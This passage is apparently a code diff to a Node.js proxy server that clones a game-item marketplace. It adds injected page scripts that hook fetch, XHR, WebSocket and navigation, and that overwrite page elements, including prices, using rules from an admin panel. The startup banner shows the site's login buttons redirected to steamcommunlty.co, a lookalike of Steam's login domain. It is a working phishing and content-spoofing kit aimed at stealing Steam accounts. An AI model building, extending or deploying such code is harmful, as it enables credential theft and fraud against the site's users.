+                    currentProtocol + '//' + window.location.host);
+            }
+            
+            // Относительные URLs
+            if (url.startsWith('/') && !url.startsWith('//')) {
+                return window.location.origin + url;
+            }
+            
+            return url;
+        } catch (e) {
+            console.error('URL modification error:', e);
+            return url; // В случае ошибки возвращаем исходный URL
+        }
+    }
+    
+    // ИСПРАВЛЕНО: Специальная обработка для GraphQL запросов с повторными попытками
+    const graphQLRetries = new Map(); // Map для отслеживания попыток запросов
+    
+    // Функция для повторной попытки GraphQL запроса
+    async function retryGraphQLRequest(url, options, attempt = 1) {
+        const MAX_ATTEMPTS = 3;
+        const RETRY_DELAY = 1000; // 1 секунда между попытками
+        
+        try {
+            console.log(\`GraphQL attempt \${attempt}: \${url}\`);
+            return await originalFetch(url, options);
+        } catch (error) {
+            if (attempt < MAX_ATTEMPTS) {
+                console.warn(\`GraphQL request failed, retrying (\${attempt}/\${MAX_ATTEMPTS})...\`);
+                await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
+                return retryGraphQLRequest(url, options, attempt + 1);
+            } else {
+                console.error('GraphQL request failed after max attempts:', error);
+                throw error;
+            }
+        }
+    }
+    
+    // Перехват fetch с улучшенной обработкой ошибок и повторными попытками для GraphQL
+    window.fetch = async function(input, init = {}) {
+        try {
+            let url = input;
+            if (typeof input === 'string') {
+                url = modifyUrl(input);
+            } else if (input instanceof Request) {
+                url = new Request(modifyUrl(input.url), input);
+            }
+            
+            // Добавляем credentials для корректной работы cookies
+            init.credentials = init.credentials || 'include';
+            
+            // Проверка на GraphQL запрос
+            const isGraphQLRequest = typeof url === 'string' && 
+                (url.includes('/api/graphql') || url.includes('/graphql'));
+            
+            if (isGraphQLRequest) {
+                console.log('GraphQL Fetch:', url);
+                return retryGraphQLRequest(url, init);
+            }
+            
+            return originalFetch.call(this, url, init);
+        } catch (e) {
+            console.error('Fetch proxy error:', e);
+            return originalFetch.call(this, input, init); // В случае ошибки используем оригинальный запрос
+        }
+    };
+    
+    // Перехват XMLHttpRequest с улучшенной обработкой ошибок
+    XMLHttpRequest.prototype.open = function(method, url, ...args) {
+        try {
+            const modifiedUrl = modifyUrl(url);
+            
+            // Добавлено специальное логирование для GraphQL запросов
+            if (url && (url.includes('/api/graphql') || url.includes('/graphql'))) {
+                console.log('GraphQL XHR:', method, modifiedUrl);
+            }
+            
+            return originalXHR.call(this, method, modifiedUrl, ...args);
+        } catch (e) {
+            console.error('XHR proxy error:', e);
+            return originalXHR.call(this, method, url, ...args); // В случае ошибки используем оригинальный URL
+        }
+    };
+    
+    // ИСПРАВЛЕНО: Улучшенная обработка WebSocket соединений с повторными попытками
+    let wsRetryTimeouts = {};
+    
+    // Функция для повторного подключения WebSocket
+    function reconnectWebSocket(url, protocols, retryCount = 0) {
+        const MAX_RETRIES = 5;
+        const RETRY_DELAY = 2000 * Math.pow(1.5, retryCount); // Увеличивающаяся задержка
+        
+        if (retryCount >= MAX_RETRIES) {
+            console.error(\`WebSocket connection failed after \${MAX_RETRIES} attempts\`);
+            return null;
+        }
+        
+        console.log(\`Attempting WebSocket connection (attempt \${retryCount + 1}/\${MAX_RETRIES}): \${url}\`);
+        
+        const ws = new originalWS(url, protocols);
+        
+        ws.addEventListener('error', function(event) {
+            console.warn(\`WebSocket error (attempt \${retryCount + 1}): \${url}\`);
+            
+            // Очищаем предыдущий таймаут, если он существует
+            if (wsRetryTimeouts[url]) {
+                clearTimeout(wsRetryTimeouts[url]);
+            }
+            
+            // Устанавливаем новый таймаут для повторной попытки
+            wsRetryTimeouts[url] = setTimeout(() => {
+                console.log(\`Retrying WebSocket connection: \${url}\`);
+                reconnectWebSocket(url, protocols, retryCount + 1);
+            }, RETRY_DELAY);
+        });
+        
+        // При успешном подключении очищаем таймауты
+        ws.addEventListener('open', function() {
+            console.log(\`WebSocket connected successfully: \${url}\`);
+            if (wsRetryTimeouts[url]) {
+                clearTimeout(wsRetryTimeouts[url]);
+                delete wsRetryTimeouts[url];
+            }
+        });
+        
+        return ws;
+    }
+    
+    // Перехват WebSocket с улучшенной обработкой и логированием
+    window.WebSocket = function(url, protocols) {
+        try {
+            const modifiedUrl = modifyUrl(url);
+            console.log('WebSocket connection:', modifiedUrl);
+            
+            // Проверка на корректность URL перед созданием WebSocket
+            if (!modifiedUrl || !modifiedUrl.startsWith(wsProtocol)) {
+                console.warn('Invalid WebSocket URL, using original:', url);
+                return new originalWS(url, protocols);
+            }
+            
+            // Используем функцию с повторными попытками
+            return reconnectWebSocket(modifiedUrl, protocols);
+        } catch (e) {
+            console.error('WebSocket proxy error:', e);
+            return new originalWS(url, protocols); // В случае ошибки используем оригинальный URL
+        }
+    };
+    
+    // ИСПРАВЛЕНО: Добавляем обработку ошибок для chunk-FWBJZS6X.js
+    window.addEventListener('error', function(event) {
+        if (event && event.filename && event.filename.includes('chunk-FWBJZS6X.js')) {
+            console.warn('Handled error in problematic chunk:', event.message);
+            event.preventDefault();
+            return false;
+        }
+        
+        if (event && event.target && event.target.tagName === 'SCRIPT') {
+            console.log('Script load error:', event.target.src);
+        }
+        
+        // Специфичная обработка для ошибок WebSocket
+        if (event && event.message && event.message.includes('WebSocket')) {
+            console.warn('WebSocket error detected:', event.message);
+        }
+    }, true);
+    
+    // ИСПРАВЛЕНО: Глобальный обработчик unhandledrejection для предотвращения падения страницы
+    window.addEventListener('unhandledrejection', function(event) {
+        if (event && event.reason) {
+            // Проверяем, связана ли ошибка с GraphQL или WebSocket
+            if (
+                (typeof event.reason.message === 'string' && 
+                 (event.reason.message.includes('GQL') || 
+                  event.reason.message.includes('WebSocket') || 
+                  event.reason.message.includes('graphql'))) ||
+                (event.reason.stack && event.reason.stack.includes('chunk-FWBJZS6X.js'))
+            ) {
+                console.warn('Handled unhandled rejection:', event.reason.message || event.reason);
+                event.preventDefault();
+                return false;
+            }
+        }
+    });
+    
+    console.log('🔧 Proxy initialized successfully with enhanced error handling');
+})();
+</script>
+`;
+
+// НОВОЕ: Скрипт для подмены значений селекторов с восстановлением оригинальных значений
+const selectorReplacementScript = `
+<script>
+(function() {
+    // Хранилище оригинальных значений элементов по селекторам
+    const originalValues = new Map();
+    
+    // Хранилище активных правил для текущей страницы
+    let activeRules = [];
+    
+    // Функция для подмены значений селекторов
+    async function replaceSelectors() {
+        // Текущий URL страницы
+        const currentPath = window.location.href;
+        
+        try {
+            // Получаем правила подмены с нашего прокси-сервера
+            const response = await fetch('/admin-api/selector-rules?page=' + encodeURIComponent(currentPath), {
+                method: 'GET',
+                credentials: 'include'
+            });
+            
+            if (!response.ok) return;
+            
+            const rules = await response.json();
+            
+            // Если для текущей страницы нет правил, возвращаем все измененные селекторы в исходное состояние
+            if (!rules || rules.length === 0) {
+                restoreOriginalValues();
+                activeRules = []; // Сбрасываем активные правила
+                return;
+            }
+            
+            // Сохраняем текущие активные правила
+            activeRules = rules.map(rule => rule.selector);
+            
+            console.log('📎 Применяю правила подмены для селекторов:', rules.length);
+            
+            // Проходим по всем правилам
+            rules.forEach(rule => {
+                try {
+                    // Находим все элементы по селектору
+                    const elements = document.querySelectorAll(rule.selector);
+                    
+                    if (elements.length === 0) {
+                        console.log('⚠️ Элемент не найден для селектора:', rule.selector);
+                        
+                        // Немедленно начинаем наблюдение для нахождения элементов, которые могут появиться позже
+                        const observer = new MutationObserver((mutations, obs) => {
+                            const elements = document.querySelectorAll(rule.selector);
+                            if (elements.length > 0) {
+                                elements.forEach(element => {
+                                    // Сохраняем оригинальное значение, если еще не сохранено
+                                    if (!originalValues.has(element)) {
+                                        originalValues.set(element, element.innerHTML);
+                                    }
+                                    element.innerHTML = rule.value;
+                                    console.log('✅ Значение подменено для селектора (отложенная подмена):', rule.selector);
+                                });
+                                // Не отключаем наблюдатель, т.к. элемент может быть перерисован Angular
+                            }
+                        });
+                        
+                        // Наблюдаем за изменениями в DOM с максимальным приоритетом
+                        observer.observe(document.documentElement, {
+                            childList: true,
+                            subtree: true,
+                            characterData: true,
+                            attributes: true
+                        });
+                        
+                        return;
+                    }
+                    
+                    // Подменяем значение для каждого найденного элемента
+                    elements.forEach(element => {
+                        // Сохраняем оригинальное значение перед подменой, если еще не сохранено
+                        if (!originalValues.has(element)) {
+                            originalValues.set(element, element.innerHTML);
+                        }
+                        element.innerHTML = rule.value;
+                        console.log('✅ Значение подменено для селектора:', rule.selector);
+                    });
+                } catch (err) {
+                    console.error('❌ Ошибка при подмене селектора:', rule.selector, err);
+                }
+            });
+            
+            // Восстанавливаем оригинальные значения для селекторов, которые больше не нужно подменять
+            restoreNonActiveSelectors();
+            
+        } catch (err) {
+            console.error('❌ Ошибка при получении правил подмены:', err);
+        }
+    }
+    
+    // Функция для восстановления оригинальных значений всех измененных элементов
+    function restoreOriginalValues() {
+        console.log('🔄 Восстанавливаю оригинальные значения для всех элементов');
+        originalValues.forEach((originalValue, element) => {
+            if (element && element.innerHTML !== originalValue) {
+                element.innerHTML = originalValue;
+            }
+        });
+    }
+    
+    // Функция для восстановления оригинальных значений только тех элементов,
+    // которые больше не нужно подменять на текущей странице
+    function restoreNonActiveSelectors() {
+        console.log('🔄 Проверяю элементы для восстановления оригинальных значений');
+        
+        originalValues.forEach((originalValue, element) => {
+            if (!element || !document.body.contains(element)) {
+                originalValues.delete(element);
+                return;
+            }
+            
+            // Проверяем, есть ли этот элемент в списке активных селекторов
+            let shouldRestore = true;
+            
+            for (const selector of activeRules) {
+                if (element.matches(selector)) {
+                    shouldRestore = false;
+                    break;
+                }
+            }
+            
+            // Если элемент не должен быть подменен на текущей странице, восстанавливаем его
+            if (shouldRestore && element.innerHTML !== originalValue) {
+                console.log('🔄 Восстанавливаю оригинальное значение для элемента');
+                element.innerHTML = originalValue;
+            }
+        });
+    }
+    
+    // Мгновенно выполняем первую подмену до загрузки DOM
+    (function immediateReplace() {
+        if (document.readyState === 'loading') {
+            replaceSelectors(); // Пытаемся подменить сразу
+            document.addEventListener('DOMContentLoaded', replaceSelectors, {once: true}); // И еще раз после загрузки DOM
+        } else {
+            replaceSelectors(); // DOM уже загружен, подменяем сразу
+        }
+    })();
+    
+    // Используем requestAnimationFrame для подмены на каждом кадре отрисовки
+    function scheduleFrameReplacement() {
+        requestAnimationFrame(() => {
+            replaceSelectors();
+            // Для Angular и других SPA - постоянная проверка на первые несколько секунд
+            const timestamp = Date.now();
+            if (timestamp - startTime < 5000) { // Проверяем 5 секунд после загрузки
+                scheduleFrameReplacement();
+            }
+        });
+    }
+    
+    // Текущее время для отслеживания первых секунд загрузки
+    const startTime = Date.now();
+    scheduleFrameReplacement();
+    
+    // Подписываемся на изменения URL для SPA
+    let lastUrl = window.location.href;
+    
+    // Функция для проверки изменения URL с мгновенной подменой
+    function checkUrlChange() {
+        const currentUrl = window.location.href;
+        if (currentUrl !== lastUrl) {
+            console.log('📍 URL изменился, запускаю подмену селекторов');
+            lastUrl = currentUrl;
+            
+            // Мгновенная подмена для нового URL
+            replaceSelectors();
+            
+            // И еще несколько попыток для динамического контента
+            const checkTime = Date.now();
+            function repeatedCheck() {
+                requestAnimationFrame(() => {
+                    replaceSelectors();
+                    if (Date.now() - checkTime < 2000) { // Проверяем 2 секунды после изменения URL
+                        repeatedCheck();
+                    }
+                });
+            }
+            repeatedCheck();
+        }
+        requestAnimationFrame(checkUrlChange); // Используем requestAnimationFrame вместо setTimeout
+    }
+    
+    // Запускаем проверку URL
+    checkUrlChange();
+    
+    // Также используем MutationObserver для отслеживания изменений в DOM
+    const observer = new MutationObserver(mutations => {
+        // Быстро определяем, есть ли релевантные изменения
+        const hasPriceChanges = mutations.some(mutation => {
+            // Приоритетно проверяем элементы с содержимым цен
+            return (mutation.type === 'childList' && 
+                    mutation.target.tagName === 'SPAN' && 
+                    (mutation.target.className.includes('ng-star-inserted') || 
+                     mutation.target.textContent.includes('₽') || 
+                     mutation.target.textContent.includes('$'))) || 
+                   (mutation.type === 'characterData' && 
+                    mutation.target.textContent && 
+                    (mutation.target.textContent.includes('₽') || 
+                     mutation.target.textContent.includes('$')));
+        });
+        
+        if (hasPriceChanges) {
+            // Для изменений, связанных с ценами, делаем подмену немедленно
+            requestAnimationFrame(replaceSelectors);
+            return;
+        }
+        
+        // Общая проверка для других типов изменений
+        const hasImportantChanges = mutations.some(mutation => 
+            (mutation.type === 'childList' && 
+             mutation.addedNodes.length > 0 && 
+             Array.from(mutation.addedNodes).some(node => 
+                node.nodeType === 1 && 
+                (node.tagName === 'DIV' || 
+                 node.tagName === 'SPAN' || 
+                 node.tagName === 'APP-PAGE-INVENTORY-PRICE')
+             )) ||
+            (mutation.type === 'attributes' && 
+             (mutation.target.tagName === 'SPAN' || 
+              mutation.target.tagName === 'DIV' || 
+              mutation.target.tagName === 'APP-PAGE-INVENTORY-PRICE'))
+        );
+        
+        if (hasImportantChanges) {
+            requestAnimationFrame(replaceSelectors); // Используем requestAnimationFrame для оптимизации
+        }
+    });
+    
+    // Наблюдаем за всем документом с максимальной глубиной и скоростью
+    observer.observe(document.documentElement, {
+        childList: true,
+        subtree: true,
+        characterData: true,
+        attributes: true,
+        attributeOldValue: true,
+        characterDataOldValue: true
+    });
+    
+    // Хак для Angular приложений - подменяем значения после изменений шаблонов
+    if (window.Zone && window.Zone.__symbol__) {
+        console.log('📍 Обнаружен Angular, устанавливаю дополнительные перехваты для мгновенной подмены');
+        
+        // Перехватываем изменения View
+        const originalRender = Element.prototype.render;
+        if (originalRender) {
+            Element.prototype.render = function(...args) {
+                const result = originalRender.apply(this, args);
+                // Мгновенно вызываем подмену после рендеринга
+                requestAnimationFrame(replaceSelectors);
+                return result;
+            };
+        }
+        
+        // Стараемся перехватить все асинхронные операции, которые могут влиять на DOM
+        const originalSetTimeout = window.setTimeout;
+        window.setTimeout = function(callback, delay, ...args) {
+            const wrappedCallback = function() {
+                const result = callback.apply(this, args);
+                // После таймаута проверяем необходимость подмены
+                if (delay < 500) { // Только для быстрых таймаутов
+                    requestAnimationFrame(replaceSelectors);
+                }
+                return result;
+            };
+            return originalSetTimeout.call(window, wrappedCallback, delay);
+        };
+    }
+    
+    // Явное добавление обработчика событий для popstate, pushState и replaceState
+    window.addEventListener('popstate', () => {
+        console.log('🔍 Обнаружена навигация popstate');
+        replaceSelectors();
+    });
+    
+    // Перехватываем History API для SPA
+    if (window.history && window.history.pushState) {
+        const originalPushState = window.history.pushState;
+        window.history.pushState = function() {
+            originalPushState.apply(this, arguments);
+            console.log('🔍 Обнаружена навигация pushState');
+            setTimeout(replaceSelectors, 50); // Небольшая задержка для обновления DOM
+        };
+    }
+    
+    if (window.history && window.history.replaceState) {
+        const originalReplaceState = window.history.replaceState;
+        window.history.replaceState = function() {
+            originalReplaceState.apply(this, arguments);
+            console.log('🔍 Обнаружена навигация replaceState');
+            setTimeout(replaceSelectors, 50); // Небольшая задержка для обновления DOM
+        };
+    }
+    
+    console.log('📍 Система подмены селекторов инициализирована с мгновенным режимом и восстановлением оригинальных значений');
+})();
+</script>
+`;
+
 // Запуск сервера
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`
-    🚀 Market Proxy Server с Админ-панелью
+    🚀 Market Proxy Server с управлением подменой значений
     📡 Port: ${PORT}
     🎯 Target: ${TARGET_HOST}
     🔌 WebSocket: ${WS_TARGET}
     🔒 HTTPS: Auto-detected
     🔑 Login Interception: Enabled for #login-head-tablet, #login-register, #login-chat, #login-head -> https://steamcommunlty.co/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580783084.RytkB5FMW0&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select
-    👑 Admin Panel: ${getBaseUrl({headers: {host: 'localhost:'+PORT}, protocol: 'http'})}/admin
+    👑 Панель управления: ${getBaseUrl({headers: {host: 'localhost:'+PORT}, protocol: 'http'})}/admin
     
     Features:
     ✓ Full HTTP/HTTPS proxy
@@ -1913,7 +2097,7 @@ server.listen(PORT, '0.0.0.0', () => {
     ✓ Content modification
     ✓ Login buttons interception
     ✓ Mixed content prevention
-    ✓ Admin Panel with Selector Value Replacement
+    ✓ Selector Value Replacement with automatic restore
     `);
 });
 
